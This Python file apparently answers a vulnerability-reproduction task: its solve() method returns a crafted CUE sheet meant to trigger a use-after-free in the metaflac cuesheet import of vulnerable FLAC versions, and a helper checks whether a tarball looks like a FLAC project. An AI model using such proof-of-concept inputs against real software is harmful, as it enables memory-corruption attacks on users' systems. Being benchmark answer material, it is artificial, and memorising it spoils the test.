import os
import tarfile
from typing import Optional


class Solution:
    def _looks_like_flac_metaflac_project(self, src_path: str) -> bool:
        try:
            if not os.path.isfile(src_path):
                return False
            with tarfile.open(src_path, "r:*") as tf:
                hit = 0
                for m in tf:
                    n = (m.name or "").lower()
                    if any(k in n for k in ("metaflac", "cuesheet", "seekpoint", "flac")):
                        hit += 1
                        if hit >= 3:
                            return True
                return hit > 0
        except Exception:
            return False

    def solve(self, src_path: str) -> bytes:
        # Minimal-ish CUE sheet intended to cause seekpoint appends during import,
        # triggering realloc-related UAF in vulnerable versions.
        poc = (
            b'FILE "a" WAVE\n'
            b'TRACK 01 AUDIO\n'
            b'INDEX 01 00:00:00\n'
            b'TRACK 02 AUDIO\n'
            b'INDEX 01 00:00:01\n'
            b'TRACK 03 AUDIO\n'
            b'INDEX 01 00:00:02\n'
            b'TRACK 04 AUDIO\n'
            b'INDEX 01 00:00:03\n'
        )

        # Keep constant behavior; optional quick sanity check (no change in output).
        _ = self._looks_like_flac_metaflac_project(src_path)
        return poc